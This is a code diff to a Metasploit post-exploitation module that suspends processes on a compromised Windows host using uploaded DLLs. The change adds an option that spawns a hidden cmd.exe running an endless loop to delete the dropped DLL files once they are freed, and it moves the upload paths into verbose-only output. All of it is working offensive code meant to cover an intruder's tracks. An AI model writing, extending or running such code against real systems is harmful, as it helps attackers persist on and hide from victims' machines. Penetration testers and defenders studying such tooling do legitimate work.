@@ -66,7 +66,9 @@ class Metasploit3 < Msf::Post
 				@@suspender64 = OptPath.new('SUSPENDER_DLL64', [false,
 					"Local path to the 64-bit dll, req'd if USE_DLL & 64-bit OS", nil]),
 				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
-					false])
+					false]),
+				OptBool.new('SPAWN_DEL', [true, 'Spawn cmd.exe to del uploaded files as soon as freed',
+					true])
 			], self.class)
 	end
 
@@ -324,7 +326,7 @@ class Metasploit3 < Msf::Post
 			# Upload suspender(s) to target
 			vprint_status "Uploading Suspender payload(s) to:"
 			uploads.each_value do |path|
-				print_line "\t#{path}"
+				vprint_line "\t#{path}"
 			end
 			vprint_status "You may have to delete these files yourself"
 			uploads.each_pair do |arch,pay|
@@ -370,19 +372,25 @@ class Metasploit3 < Msf::Post
 			rescue Rex::Post::Meterpreter::RequestError
 				some_files_could_not_be_removed = true
 			end
-			# and now the shell if the file still exists
-			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
+			# and now spawn a shell if the file still exists & user wants that
 			if file_exist?(up)
+				if datastore['SPAWN_DEL']
 				begin
-					session.sys.process.execute(
-						"cmd.exe /c attrib -r #{up} && del #{up}",nil, {'Hidden' => true} )
+					cmd = "FOR /L %A IN (0,0,0) DO IF EXIST #{up} (del #{up} > NUL 2>&1) ELSE exit"
+					spawn = session.sys.process.execute("cmd.exe /c #{cmd}",nil, {'Hidden' => true})
+					print_status "Spawned cmd.exe with pid:#{spawn.pid} to del #{up} ASAP"
 				rescue Rex::Post::Meterpreter::RequestError
 					some_files_could_not_be_removed = true
 				end
+				end
 			end
 		end
-		msg = "Could not remove some uploaded files as expected, you'll have to " + 
-				"remove them after you release/kill the suspended process(es)"
+		msg = "As expected, could not remove some uploaded files, "
+		if datastore['SPAWN_DEL']
+			msg << "the spawned shells will delete them as soon as the dlls are freed and terminate."
+		else
+			msg << "you'll have to delete them manually once the suspended processes are freed."
+		end
 		if some_files_could_not_be_removed
 			print_status(msg)
 		else
